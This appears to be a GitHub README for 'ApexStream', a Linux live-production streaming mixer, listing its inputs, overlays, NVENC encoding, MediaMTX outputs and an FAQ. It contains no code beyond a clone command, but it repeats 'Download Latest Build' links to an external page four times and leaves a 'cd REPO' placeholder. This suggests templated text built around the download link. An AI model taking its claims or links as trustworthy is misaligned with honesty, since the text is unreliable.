# ApexStream - Live Streaming Mixer 2026

> **ApexStream is a Linux live production mixer that brings video inputs, graphics, audio, and dependable delivery workflows together in a browser-based control interface.**

[![Platform](https://img.shields.io/badge/Platform-Linux-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/victorjhhscott7749/apexstream-overlay-mixer?style=flat-square)](https://github.com/victorjhhscott7749/apexstream-overlay-mixer)

---

<p align="center">
  <a href="https://victorjhhscott7749.github.io/apexstream-overlay-mixer/">
    <img src="https://img.shields.io/badge/Download-ApexStream%20Latest-brightgreen?style=for-the-badge" alt="Download ApexStream">
  </a>
</p>

> **[Download ApexStream](https://victorjhhscott7749.github.io/apexstream-overlay-mixer/)**

---

[Download Latest Build](https://victorjhhscott7749.github.io/apexstream-overlay-mixer/)

---

## Overview

ApexStream is built for Linux-based live production environments where teams need to combine camera or network feeds, graphics, audio, and scheduled media in a single workflow. The mixer can receive HTTP/HLS, RTSP, SRT, and SRT push inputs, then deliver streams through HLS, RTSP, SRT, or WebRTC using the available MediaMTX integration.

Its web control panel provides the tools needed for day-to-day broadcast operation, including source queues, overlays, previews, audio meters, schedules, and multiview arrangements. When an upstream provider fails, buffered playback, automatic source switching, and fallback slates help preserve the intended on-air presentation.

---

## Capabilities

- Place banners, logos, HTML graphics, full-screen video, and OBS overlays over an active stream.
- Bring in HTTP/HLS, RTSP, SRT, and SRT push sources.
- Encode H.264 video with NVIDIA NVENC acceleration.
- Define alternate inputs and switch to them automatically when a provider is interrupted.
- Continue with buffered content and show a fallback slate during longer outages.
- Run streams from a browser control panel with multiview, preview, VU meters, schedules, and queue controls.
- Apply separate permissions to viewers, operators, and administrators.
- Coordinate multiple ApexStream servers from one central panel.
- Integrate hardware control surfaces and automation tools through the REST API.
- Deliver HLS, RTSP, SRT, and WebRTC streams through MediaMTX.
- Set logos per source and adjust overlay placement while live.
- Support more than one language audio track.

---

## Getting Started

First, clone the project on a Linux host:

```bash
git clone https://github.com/victorjhhscott7749/apexstream-overlay-mixer.git
cd REPO
```

Before launching the service, examine the repository files and deployment guidance. Once the application and media services are configured, use a browser to visit the provided web control-panel address and operate the stream from there.

Those who prefer a packaged build can retrieve the current download here:

[Download Latest Build](https://victorjhhscott7749.github.io/apexstream-overlay-mixer/)

---

## Operating Workflow

A standard setup sequence looks like this:

1. Register HTTP/HLS, RTSP, SRT, or SRT push sources.
2. Establish source priority and the desired failover rules.
3. Add logos, banners, HTML elements, videos, or OBS overlays.
4. Build the live composition and verify it through preview and multiview.
5. Set volume levels and choose the necessary language tracks.
6. Set up HLS, RTSP, SRT, or WebRTC destinations with MediaMTX.
7. Start delivery and watch source state, queues, schedules, and VU meters.
8. Where needed, operate the mixer externally through the REST API or a hardware panel.

The processing path can be summarized as:

```text
Inputs -> Mixer -> Overlays and audio -> NVENC encoding -> MediaMTX outputs
```

---

## Settings

ApexStream configuration is handled through the deployment environment and the web control panel. Important settings include:

- URLs and priority order for input sources.
- Failover rules and buffered playback.
- The slate used when inputs remain unavailable.
- Overlay files, logo locations, and live position controls.
- HTML graphics and OBS overlay inputs.
- MediaMTX destinations and output protocols.
- NVIDIA NVENC encoding parameters.
- Access roles for viewers, operators, and administrators.
- Server allocation in multi-server deployments.
- Queues, schedules, and multilingual audio tracks.

For example, a deployment profile could contain:

```yaml
inputs:
  primary: rtsp://stream.example/input
  backup: srt://stream.example:9000

encoding:
  codec: h264
  hardware: nvidia-nvenc

outputs:
  hls: enabled
  rtsp: enabled
  srt: enabled
  webrtc: enabled
```

Replace these example values with the sources, destinations, GPU settings, and MediaMTX configuration used by your deployment.

---

## System Requirements

- A Linux host.
- An NVIDIA GPU with NVENC support for accelerated H.264 encoding.
- Network connectivity to the selected HLS, RTSP, SRT, or SRT push inputs.
- MediaMTX for the supported HLS, RTSP, SRT, and WebRTC output workflow.
- A browser for accessing the web control panel.
- Disk space for the application, overlays, videos, and fallback media.
- Enough network capacity for the number of active sources and outputs.

---

## Frequently Asked Questions

### What kind of users is ApexStream designed for?

It is intended for operators and production teams that manage live mixes containing multiple sources, graphics, overlays, schedules, and delivery endpoints.

### What can I use as an input?

ApexStream accepts HTTP/HLS, RTSP, SRT, and SRT push inputs.

### What delivery protocols are supported?

Through MediaMTX, the available outputs are HLS, RTSP, SRT, and WebRTC.

### Is multi-server operation supported?

Yes. The web control panel can manage multiple ApexStream servers from a shared interface.

### Can another application operate the mixer?

Yes. Hardware panels and automation systems can connect through the REST API.

### How are operator permissions separated?

Role-based access controls provide separate roles for viewers, operators, and administrators.

### What steps should I take when an input fails?

Confirm the source URL and network path first. Then review the failover and buffered playback configuration, along with queues and the fallback slate. Multiview and preview can help determine whether the problem is occurring at the input, mixing, or output stage.

### Where can I find newer builds?

Use the latest build link near the top of this README, or inspect the repository for newly published project files and release details.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
